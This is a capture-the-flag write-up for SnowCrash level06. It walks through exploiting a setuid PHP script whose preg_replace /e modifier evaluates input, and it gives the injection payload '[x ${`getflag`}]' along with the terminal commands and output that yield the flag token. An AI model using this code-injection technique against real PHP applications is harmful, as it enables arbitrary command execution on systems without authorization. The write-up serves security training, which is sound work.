#SnowCrash Level06

Note: This level made me go crazy. Since I sucked at php.

We have a file and a binary in our home directory.
```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Lets see what we have on level06.php :
```
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
this is so ugly, lets use a php beautifier
```
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```
Okii now this is readable.
After some googling I found that we have a reg_replace exploit in the /e attribute.
It execute the code as a vairable.
There are 2 types of exploit in this case.
Since we have the function Y inside the quotes we need to use ${}.
Also we need a regex understanding.
Before that we find that the $y variable should be a file and it gets opened and read.
After some regex hell, we can finally say that the expression inside that file should be :
```
[x ${`phpinfo();`}]
```
I thought it's gonna work but it didn't.
```
level06@SnowCrash:~$ echo '[x ${`phpinfo();`}]' > /tmp/lvl06
level06@SnowCrash:~$ chmod 777 /tmp/lvl06
level06@SnowCrash:~$ ./level06 /tmp/lvl06
sh: 1: Syntax error: ";" unexpected
PHP Notice:  Undefined variable:  in /home/user/level06/level06.php(4) : regexp code on line 1

```
I almost gave up on this idea but then i found out, that its an sh error not php.
Change that phpinfo(); to getflag, and see the result.
```
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/lvl06
level06@SnowCrash:~$ ./level06 /tmp/lvl06
PHP Notice:  Undefined variable: Check flag.Here is your token : 
 in /home/user/level06/level06.php(4) : regexp code on line 1
```